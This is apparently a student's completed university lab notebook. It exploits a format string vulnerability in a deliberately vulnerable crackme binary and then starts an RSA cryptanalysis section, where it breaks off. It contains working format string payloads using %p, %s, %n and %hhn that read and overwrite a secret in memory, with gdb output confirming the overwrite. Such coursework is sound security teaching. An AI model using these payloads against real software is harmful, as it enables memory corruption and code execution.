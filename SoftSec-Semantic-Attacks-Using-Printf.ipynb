{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "CCkerh77NF1x"
      },
      "source": [
        "# Exercise 3: Semantic Attacks\n",
        "\n",
        "### Assignment Deadline: March 10 (Monday) before 11:59PM\n",
        "\n",
        "**This assignment is worth 10% of the semester grade.**\n",
        "\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "c3D619DaOcLf"
      },
      "source": [
        "In this project, we will explore two different types of semantic attacks, which exploit vulnerabilities caused by logical errors or confusions within the software. Generally, this type of vulnerabilities is harder to find, but once they are discovered and exposed, it can be harder to mitigated than memory vulerabilities such as buffer overflows."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2O5bxJeGNJlv"
      },
      "source": [
        "## Part 1: Format String Vulnerability\n",
        "\n",
        "For the first part, let's do some exercise regarding format string vulnerability. The format string vulnerability is a powerful class of bugs on the commonly-used `printf` function and its family (`sprintf`, fprintf`, etc).\n",
        "This benign-looking bug allows arbitrary read/write and thus arbitrary execution. To conduct this attack, you do need to have some knowledge about the structure of program stacks and how variable-length arguments are implemented in C."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "bj1UHQ7KNRe0"
      },
      "source": [
        "### Step 1.0: A vulnerable program crackme0x00\n",
        "\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "scOqSn-lNeMw"
      },
      "source": [
        "We start with a vulnerable program called `crackme0x00`:"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Zif_Ycd0UMbo"
      },
      "source": [
        "```\n",
        "#include <stdio.h>\n",
        "#include <stdlib.h>\n",
        "#include <unistd.h>\n",
        "#include <string.h>\n",
        "#include <err.h>\n",
        "\n",
        "unsigned int secret = 0xdeadbeef;\n",
        "\n",
        "void handle_failure(char *buf) {\n",
        "  char msg[100];\n",
        "  snprintf(msg, sizeof(msg), \"Invalid Password! %s\\n\", buf);\n",
        "  printf(msg);\n",
        "}\n",
        "\n",
        "int main(int argc, char *argv[])\n",
        "{\n",
        "  setreuid(geteuid(), geteuid());\n",
        "  setvbuf(stdout, NULL, _IONBF, 0);\n",
        "  setvbuf(stdin, NULL, _IONBF, 0);\n",
        "\n",
        "  int tmp = secret;\n",
        "\n",
        "  char buf[100];\n",
        "  printf(\"IOLI Crackme Level 0x00\\n\");\n",
        "  printf(\"Password:\");\n",
        "\n",
        "  fgets(buf, sizeof(buf), stdin);\n",
        "\n",
        "  if (!strcmp(buf, \"250382\\n\")) {\n",
        "    printf(\"Password OK :)\\n\");\n",
        "  } else {\n",
        "    handle_failure(buf);\n",
        "  }\n",
        "\n",
        "  if (tmp != secret) {\n",
        "    puts(\"The secret is modified!\\n\");\n",
        "  }\n",
        "  \n",
        "  return 0;\n",
        "}\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "FD6A7lj3OLBr"
      },
      "source": [
        "Now, let's download the program:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 2,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "mBcIZ15KN2FK",
        "outputId": "b99beb45-55eb-4c83-b12c-43e8866e02db"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "--2025-04-20 13:10:13--  https://github.com/chiache/csce713-assignments/raw/master/lab3/crackme0x00\n",
            "Resolving github.com (github.com)... 140.82.114.4\n",
            "Connecting to github.com (github.com)|140.82.114.4|:443... connected.\n",
            "HTTP request sent, awaiting response... 302 Found\n",
            "Location: https://raw.githubusercontent.com/chiache/csce713-assignments/master/lab3/crackme0x00 [following]\n",
            "--2025-04-20 13:10:14--  https://raw.githubusercontent.com/chiache/csce713-assignments/master/lab3/crackme0x00\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 15916 (16K) [application/octet-stream]\n",
            "Saving to: ‘crackme0x00’\n",
            "\n",
            "crackme0x00         100%[===================>]  15.54K  --.-KB/s    in 0.001s  \n",
            "\n",
            "2025-04-20 13:10:14 (19.6 MB/s) - ‘crackme0x00’ saved [15916/15916]\n",
            "\n"
          ]
        }
      ],
      "source": [
        "!wget -O crackme0x00 https://github.com/chiache/csce713-assignments/raw/master/lab3/crackme0x00\n",
        "!chmod 755 crackme0x00"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "BXwwJTW-OOIC"
      },
      "source": [
        "When we type an incorrect password, it produces an error message like this:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 3,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ZSnWcyRMOUSk",
        "outputId": "77a6d7d3-2bf9-4199-e9ea-7c3b2b13d268"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "zsh:1: exec format error: ./crackme0x00\n"
          ]
        }
      ],
      "source": [
        "!echo \"asdf\" | ./crackme0x00"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 3,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "70666SWfBn7O",
        "outputId": "76a70781-1446-488b-d71b-9b3d06dd179d"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "zsh:1: exec format error: ./crackme0x00\n"
          ]
        }
      ],
      "source": [
        "!echo \"250382\" | ./crackme0x00"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "pjl__XKNNkQC"
      },
      "source": [
        "Unfortunately, this program is using `printf()` in a very insecure way.\n",
        "\n",
        "\n",
        "```\n",
        "snprintf(msg, sizeof(msg), \"Invalid Password! %s\\n\", buf);\n",
        "printf(msg);\n",
        "```\n",
        "\n",
        "\n",
        "\n",
        "Please note that msg might contain your input (e.g., invalid password). If it contains a special format specifier, like `%`, `printf()` interprets its format specifier, causing a security issue.\n",
        "\n",
        "Let's try typing `%p`:\n",
        "\n",
        "*   `%p`: pointer\n",
        "*   `%s`: string\n",
        "*   `%d`: integer\n",
        "*   `%x`: hexadecimal interger"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Fb1U0ypCO27d",
        "outputId": "76cc8127-16b5-4889-c0f3-60319ca8e390"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "IOLI Crackme Level 0x00\n",
            "Password:Invalid Password! 0x64\n",
            "\n"
          ]
        }
      ],
      "source": [
        "!echo \"%p\" | ./crackme0x00"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "3Eh-K720PAB1"
      },
      "source": [
        "What was the output? Does it looks like an integer value? If so, you have successfully found the vulnerability. Now, let's go crazy by putting more `%p`: x 15:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "snTxtb8BO45C",
        "outputId": "4a8ce9ae-02de-4544-ee6f-e01ad30b3a0d"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "IOLI Crackme Level 0x00\n",
            "Password:Invalid Password! 1=0x64|2=0x804a008|3=0xffc9dea8|4=0xf7f5aa40|5=0xf7f33f20|6=0x8048383|7=0xffc9dea8|8=0xffc9de40|9=0xf7f5ac0c|10=0x61766e49|11=0x2064696c|12=0x73736150|13=0x64726f77|14=0x3d312021|15=0x327c7025\n"
          ]
        }
      ],
      "source": [
        "! echo \"1=%p|2=%p|3=%p|4=%p|5=%p|6=%p|7=%p|8=%p|9=%p|10=%p|11=%p|12=%p|13=%p|14=%p|15=%p\"  | ./crackme0x00"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "3mc-2roGRhjF"
      },
      "source": [
        "Since it's so tedious to keep putting `%p`, printf-like functions provide a convenient way to point to the n-th arguments:\n",
        "\n",
        "```\n",
        "| %[nth]$p\n",
        "(e.g., %1$p = first argument)\n",
        "```"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "r4R1VqDXPa2G",
        "outputId": "1fef1985-7cae-469e-b4e5-ad5f9b30227a"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "IOLI Crackme Level 0x00\n",
            "Password:Invalid Password! 0x61766e49\n",
            "\n"
          ]
        }
      ],
      "source": [
        "!echo \"%10\\$p\" | ./crackme0x00"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "RP6O0EdbR_Rw"
      },
      "source": [
        "**NOTE. \\\\$ is to avoid the interpretation (e.g., $PATH) by the shell.**"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "5_krzMZnSFWc"
      },
      "source": [
        "It shall match the 10th stack value listed above."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "kRIctJlcSWLf"
      },
      "source": [
        "### Step 1.1. Format String Bug to an Arbitrary Read\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "qjQS_8-BSYXX"
      },
      "source": [
        "Let's exploit this format string bug to write an arbitrary value to an arbitrary memory region.\n",
        "\n",
        "Have you noticed some interesting values in the stack?"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "jyTKZ7F4Shlg"
      },
      "source": [
        "```\n",
        "4=0xf7f9d620\n",
        "...\n",
        "10=0x61766e49  'Inva'\n",
        "11=0x2064696c  'lid '\n",
        "12=0x73736150  'Pass'\n",
        "13=0x64726f77  'word'\n",
        "14=0x3d312021  '! 1='\n",
        "15=0x327c7025  '%p|2'\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UfpFG7QWSkPn"
      },
      "source": [
        "It seems that what we put onto the stack is actually being interpreted as an argument. What's going on?\n",
        "\n",
        "When you invoke a `printf()` function, your arguments passed through the stack are placed like these:"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "6c-b9z8wSn4l"
      },
      "source": [
        "```\n",
        "printf(\"%s\", a1, a2 ...)\n",
        "\n",
        "[ra]\n",
        "[  ] --+\n",
        "[a1]   |   a1: 1st arg, %1$s\n",
        "[a2]   |   a2: 2nd arg, %2$s\n",
        "[%s] <-+     : 3rd arg, %3$s\n",
        "[..]\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "VW1Y9Lh5Sq-3"
      },
      "source": [
        "In this simple case, you can point to the %s (as value) with %3$s! It means you can 'read' (e.g., 4 bytes) an arbitrary memory region like this:"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "XAYFKSH1StXU"
      },
      "source": [
        "```\n",
        "printf(\"\\xaa\\xaa\\xaa\\xaa%3$s\", a1, a2 ...)\n",
        "\n",
        "[ra ]\n",
        "[   ] --+\n",
        "[a1 ]   |\n",
        "[a2 ]   |\n",
        "[ptr] <-+\n",
        "[.. ]\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8sj7pU5fSxcr"
      },
      "source": [
        "It reads (`%s`) 4 bytes at `0xaaaaaaaa` and prints out its value. In case of the target binary, where is your controllable input located in the stack (the N value in the below)?\n",
        "\n",
        "The output should look like this (replace the N with certain value):\n",
        "```\n",
        "$ echo \"BBAAAA%N\\$p\" | ./crackme0x00\n",
        "IOLI Crackme Level 0x00\n",
        "Password:Invalid Password! BBAAAA0x41414141\n",
        "```"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Np5U4ss4SVii",
        "outputId": "d975bca9-10bb-4a26-cf55-248470feb405"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "zsh:1: exec format error: ./crackme0x00\n"
          ]
        }
      ],
      "source": [
        "!echo \"BBAAAA%15\\$x\" | ./crackme0x00"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "bMscou5yCHSg",
        "outputId": "f2186561-d74e-4b87-8c87-0d6da1847aa7"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "IOLI Crackme Level 0x00\n",
            "Password:/bin/bash: line 1: 12866 Done                    echo \"BBAAAA%15\\$s\"\n",
            "     12867 Segmentation fault      (core dumped) | ./crackme0x00\n"
          ]
        }
      ],
      "source": [
        "!echo \"BBAAAA%15\\$s\" | ./crackme0x00"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "H4YnvVmegqbX"
      },
      "source": [
        "What happens when we replace %p with %s? How does it crash?"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2yEuMfMfguZ5"
      },
      "source": [
        "With %s it crashes as the memory address (0x41414141) it is going to access is not a valid memory location so it causes a segmentation fault."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "bvZWtj6qS_8A"
      },
      "source": [
        "**[TASK] Please add a cell below to read the secret value from the crackme0x00 program using the format string vulnerability.**\n",
        "\n",
        "Note that you can locate the address of secret by using nm:\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "PkpnFzktRsbd",
        "outputId": "198d1300-ec6e-48a0-e263-22b50e185336"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "0804c03c D secret\n"
          ]
        }
      ],
      "source": [
        "!nm crackme0x00 | grep secret"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "DWNLezU2bEv9",
        "outputId": "2fe33d3c-56c2-4cbb-ef21-a9f729bd5216"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "IOLI Crackme Level 0x00\n",
            "Password:Invalid Password! BB<�\u0004\b 804c03c\n",
            "\n"
          ]
        }
      ],
      "source": [
        "!echo -e \"BB\\x3c\\xc0\\x04\\x08 %15\\$x\" | ./crackme0x00"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ddl1mPUIB1W5",
        "outputId": "c7019cbf-195a-409f-c333-882b21127a15"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "IOLI Crackme Level 0x00\n",
            "Password:Invalid Password! BB<�\u0004\b 0x804c03c\n",
            "\n"
          ]
        }
      ],
      "source": [
        "!echo -e \"BB\\x3c\\xc0\\x04\\x08 %15\\$p\" | ./crackme0x00"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "P6J5dpzoB88_",
        "outputId": "64d7d501-00dd-4665-a2d2-791a23e7d211"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "IOLI Crackme Level 0x00\n",
            "Password:Invalid Password! BB<�\u0004\b ﾭ�\n",
            "\n"
          ]
        }
      ],
      "source": [
        "!echo -e \"BB\\x3c\\xc0\\x04\\x08 %15\\$s\" | ./crackme0x00"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "-nqVpk83B45L",
        "outputId": "c93f984b-c7a5-4a13-d87f-fe460f447445"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "IOLI Crackme Level 0x00\n",
            "Password:Invalid Password! deadbeef\n",
            "\n"
          ]
        }
      ],
      "source": [
        "!echo -e \"%49\\$x\" | ./crackme0x00"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7k6x55AcWFDn"
      },
      "source": [
        "### Step 1.2. Format String Bug to an Arbitrary Write\n",
        "\n",
        "In fact, `printf()` is very complex, and it supports a 'write': it writes the total number of bytes printed so far to the location you specified.\n",
        "\n",
        "*   `%n`: write number of bytes printed (as an int)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Nj6z3QyOWRlE"
      },
      "source": [
        "```\n",
        "printf(\"aaaa%n\", &len);\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "mHiWqPILWTZJ"
      },
      "source": [
        "`len` contains `4 = strlen(\"aaaa\")` as a result.\n",
        "\n",
        "Similar to the arbitrary read, you can also write to an arbitrary memory location like this:"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "fTH7DHWRWaUK"
      },
      "source": [
        "```\n",
        "printf(\"\\xaa\\xaa\\xaa\\xaa%3$n\", a1, a2 ...)\n",
        "\n",
        "[ra ]\n",
        "[   ] --+\n",
        "[a1 ]   |\n",
        "[a2 ]   |\n",
        "[ptr] <-+\n",
        "[.. ]\n",
        "\n",
        "*0xaaaaaaaa = 4 (i.e., \\xaa x 4 are printed so far)\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Mwlc4D-xWdX1"
      },
      "source": [
        "Then, how to write an arbitrary value? We need another useful specifier of printf:"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "s3pUgn_gWftg"
      },
      "source": [
        "```\n",
        "| %[len]d\n",
        "(e.g., %10d: print out 10 spacers)\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "nRBooVhGWi9G"
      },
      "source": [
        "To write 10 to 0xaaaaaaaa, you can print 6 more characters like this:"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "EGT4d4Y2WlPM"
      },
      "source": [
        "```\n",
        "printf(\"\\xaa\\xaa\\xaa\\xaa%6d%3$n\", a1, a2 ...)\n",
        "                        ---\n",
        "*0xaaaaaaaa = 10\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2jGu0kHEWqFG"
      },
      "source": [
        "By using this, you can write an arbitrary value to the arbitrary location. For example, you can write a value, `0xc0ffee`, to the location, `0xaaaaaaaa`:"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "LcLXThEQWwCn"
      },
      "source": [
        "### 1. You can either write four bytes at a time like this:\n",
        "\n",
        "```\n",
        "*(int *)0xaaaaaaaa = 0x000000ee\n",
        "*(int *)0xaaaaaaab = 0x000000ff\n",
        "*(int *)0xaaaaaaac = 0x000000c0\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "AnGuT5HnW0z7"
      },
      "source": [
        "### 2. Or you can use these smaller size specifiers like below:\n",
        "\n",
        "*   `%hn`: write the number of printed bytes as a short\n",
        "*   `%hhn`: write the number of printed bytes as a byte\n",
        "\n",
        "```\n",
        "printf(\"\\xaa\\xaa\\xaa\\xaa%6d%3$hhn\", a1, a2 ...)\n",
        "                        ---\n",
        "*(unsigned char*)0xaaaaaaaa = 0x10\n",
        "```\n",
        "\n",
        "so,\n",
        "\n",
        "```\n",
        "*(unsigned char*)0xaaaaaaaa = 0xee\n",
        "*(unsigned char*)0xaaaaaaab = 0xff\n",
        "*(unsigned char*)0xaaaaaaac = 0xc0\n",
        "```"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "o4C6LbNRXA1Y"
      },
      "source": [
        "**[TASK] Please add a cell below to overwrite the secret value with `0xc0ffee` using the format string vulnerability:**"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4d2IbAqzw36j"
      },
      "source": [
        "## Method 1"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "UJWBINR0hatb",
        "outputId": "eca29a91-5f2c-4bc1-dee7-71c30bfd2b11"
      },
      "outputs": [],
      "source": [
        "!echo -e \"BB\\x3c\\xc0\\x04\\x08%12648406c%15\\$n\" | ./crackme0x00 # 0x00c0ffee = 12648430"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "fvciWrR9w68T"
      },
      "source": [
        "## Method 2"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 5,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "AMiB9Bhew03W",
        "outputId": "bb1e1d9c-3b57-4180-b2a3-07e65c7df3a9"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "zsh:1: exec format error: ./crackme0x00\n"
          ]
        }
      ],
      "source": [
        "!echo -e \"BB\\x3e\\xc0\\x04\\x08\\x3c\\xc0\\x04\\x08\\x3d\\xc0\\x04\\x08\\x3f\\xc0\\x04\\x08%156d%15\\$hhn%46d%16\\$hhn%17d%17\\$hhn%1c%18\\$hhn\" | ./crackme0x00 | xxd # 0xc0 (192) --> 0xee (238) --> 0xff (255) -> 0x00 (256)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "haWd9rjdheYO"
      },
      "source": [
        "## For Debug"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Eq-Q0kcujf0N",
        "outputId": "adf9c2df-3a3d-4d59-9add-57f8ded6132a"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "         U __libc_start_main@@GLIBC_2.0\n",
            "080492fe T main\n"
          ]
        }
      ],
      "source": [
        "!nm crackme0x00 | grep main"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "zhqdgq3lFWXZ",
        "outputId": "651039cf-b279-4f30-f286-8e17f4d60282"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "\r0% [Working]\r            \rHit:1 http://security.ubuntu.com/ubuntu jammy-security InRelease\n",
            "\r0% [Connecting to archive.ubuntu.com (185.125.190.83)] [Connected to cloud.r-project.org (18.160.213\r                                                                                                    \rHit:2 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64  InRelease\n",
            "Hit:3 https://cloud.r-project.org/bin/linux/ubuntu jammy-cran40/ InRelease\n",
            "Hit:4 http://archive.ubuntu.com/ubuntu jammy InRelease\n",
            "Hit:5 https://r2u.stat.illinois.edu/ubuntu jammy InRelease\n",
            "Hit:6 http://archive.ubuntu.com/ubuntu jammy-updates InRelease\n",
            "Hit:7 http://archive.ubuntu.com/ubuntu jammy-backports InRelease\n",
            "Hit:8 https://ppa.launchpadcontent.net/deadsnakes/ppa/ubuntu jammy InRelease\n",
            "Hit:9 https://ppa.launchpadcontent.net/graphics-drivers/ppa/ubuntu jammy InRelease\n",
            "Hit:10 https://ppa.launchpadcontent.net/ubuntugis/ppa/ubuntu jammy InRelease\n",
            "Reading package lists... Done\n",
            "W: Skipping acquire of configured file 'main/source/Sources' as repository 'https://r2u.stat.illinois.edu/ubuntu jammy InRelease' does not seem to provide it (sources.list entry misspelt?)\n",
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "gdb is already the newest version (12.1-0ubuntu1~22.04.2).\n",
            "0 upgraded, 0 newly installed, 0 to remove and 29 not upgraded.\n"
          ]
        }
      ],
      "source": [
        "!apt-get update && apt-get install -y gdb"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qMpAPL011p3L",
        "outputId": "b7cd111d-0724-4f42-cee5-24e076bdcb38"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Reading symbols from \u001b[32m./crackme0x00\u001b[m...\n",
            "(No debugging symbols found in \u001b[32m./crackme0x00\u001b[m)\n",
            "Breakpoint 1 at \u001b[34m0x8049415\u001b[m\n",
            "Starting program: \u001b[32m/content/crackme0x00\u001b[m < <(echo -en 'BB\\x3e\\xc0\\x04\\x08\\x3c\\xc0\\x04\\x08\\x3d\\xc0\\x04\\x08%160d%15$hhn%46d%16$hhn%17d%17$hhn')\n",
            "[Thread debugging using libthread_db enabled]\n",
            "Using host libthread_db library \"\u001b[32m/lib/x86_64-linux-gnu/libthread_db.so.1\u001b[m\".\n",
            "IOLI Crackme Level 0x00\n",
            "Password:Invalid Password! BB>�\u0004\b<�\u0004\b=�\u0004\b                                                                                                                                                             100                                     134520840           -14376\n",
            "\n",
            "Breakpoint 1, \u001b[34m0x08049415\u001b[m in \u001b[33mmain\u001b[m ()\n",
            "\u001b[34m0x804c03c\u001b[m <\u001b[33msecret\u001b[m>:\t0xdec0ffee\n",
            "Continuing.\n",
            "The secret is modified!\n",
            "\n",
            "[Inferior 1 (process 13639) exited normally]\n"
          ]
        }
      ],
      "source": [
        "!gdb -q -ex \"break *0x08049415\" -ex \"run < <(echo -en 'BB\\x3e\\xc0\\x04\\x08\\x3c\\xc0\\x04\\x08\\x3d\\xc0\\x04\\x08%160d%15\\$hhn%46d%16\\$hhn%17d%17\\$hhn')\" -ex \"x/x 0x0804c03c\" -ex \"continue\" -ex \"quit\" ./crackme0x00"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "K14VdoC-FVmy",
        "outputId": "09fdb1b9-90aa-462c-f200-2a2745ae9e10"
      },
      "outputs": [],
      "source": [
        "!gdb -q -ex \"break *0x08049415\" -ex \"run < <(echo -en 'BB\\x3c\\xc0\\x04\\x08%12648406c%15\\$n')\" -ex \"x/x 0x0804c03c\" -ex \"continue\" -ex \"quit\" ./crackme0x00"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "7c_AUK3umYLa",
        "outputId": "4cca7969-8786-4732-e8cb-17bf9069d54c"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Reading symbols from \u001b[32m./crackme0x00\u001b[m...\n",
            "(No debugging symbols found in \u001b[32m./crackme0x00\u001b[m)\n",
            "Breakpoint 1 at \u001b[34m0x8049415\u001b[m\n",
            "Starting program: \u001b[32m/content/crackme0x00\u001b[m < <(echo -en 'BB\\x3e\\xc0\\x04\\x08\\x3c\\xc0\\x04\\x08\\x3d\\xc0\\x04\\x08\\x3f\\xc0\\x04\\x08%156d%15$hhn%46d%16$hhn%17d%17$hhn%1c%18$hhn')\n",
            "[Thread debugging using libthread_db enabled]\n",
            "Using host libthread_db library \"\u001b[32m/lib/x86_64-linux-gnu/libthread_db.so.1\u001b[m\".\n",
            "IOLI Crackme Level 0x00\n",
            "Password:Invalid Password! BB>�\u0004\b<�\u0004\b=�\u0004\b?�\u0004\b                                                                                                                                                         100                                     134520840           -14376@\n",
            "\n",
            "Breakpoint 1, \u001b[34m0x08049415\u001b[m in \u001b[33mmain\u001b[m ()\n",
            "\u001b[34m0x804c03c\u001b[m <\u001b[33msecret\u001b[m>:\t0x00c0ffee\n",
            "Continuing.\n",
            "The secret is modified!\n",
            "\n",
            "[Inferior 1 (process 13679) exited normally]\n"
          ]
        }
      ],
      "source": [
        "!gdb -q -ex \"break *0x08049415\" -ex \"run < <(echo -en 'BB\\x3e\\xc0\\x04\\x08\\x3c\\xc0\\x04\\x08\\x3d\\xc0\\x04\\x08\\x3f\\xc0\\x04\\x08%156d%15\\$hhn%46d%16\\$hhn%17d%17\\$hhn%1c%18\\$hhn')\" -ex \"x/x 0x0804c03c\" -ex \"continue\" -ex \"quit\" ./crackme0x00"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "HfgJeWeOPpnZ"
      },
      "source": [
        "## Part 2: RSA Attacks\n",
        "\n",
        "In this part, we are exploring a type of attacks called cryptanalysis attacks, sometimes in the form of side-channel attacks. Cryptography algorithms, just like other applications, can have logical errors that lead to bugs and vulnerabilities. The results of logical errors in cryptography algorithms can range from failures of encryption or decryption to ease of deciphering without the keys or recovery of the encryption keys. Well-known broken or weak ciphers or secure hash algorithms include DES, MD5, and SHA-1.\n",
        "\n",
        "We will be mainly targetting RSA (Rivest–Shamir–Adleman), a public-key encryption algorithm widely used in modern everyday applications. More particularly, RSA implementations can be found in PGP encryption, digital signatures, SSL, disk encryption etc."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "B5B3J8CJUt1R"
      },
      "source": [
        "### Step 2.0: Understanding RSA"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "rt_MDvOVV_hQ"
      },
      "source": [
        "We will first go into some basics of the RSA algorithm. If you want to know more details, here's an [article](https://www.geeksforgeeks.org/rsa-algorithm-cryptography/) for you to read.\n",
        "\n",
        "\n",
        "RSA encryption uses a pair of parameters *(e, n)* to encrypt the message. Assuming the message is *M* (think of a simple integer number), you can encrypt the message as the follows:\n",
        "\n",
        "**$C$ = $M^e$ mod $n$**\n",
        "\n",
        "\n",
        "On the other hand, to decrypt the data, we use another pair of parameter *(d, n)*. Assuming the encrypted message is *C*, you can decrypt the message as the follows:\n",
        "\n",
        "\n",
        "**$M$ = $C^d$ mod $n$**\n",
        "\n",
        "\n",
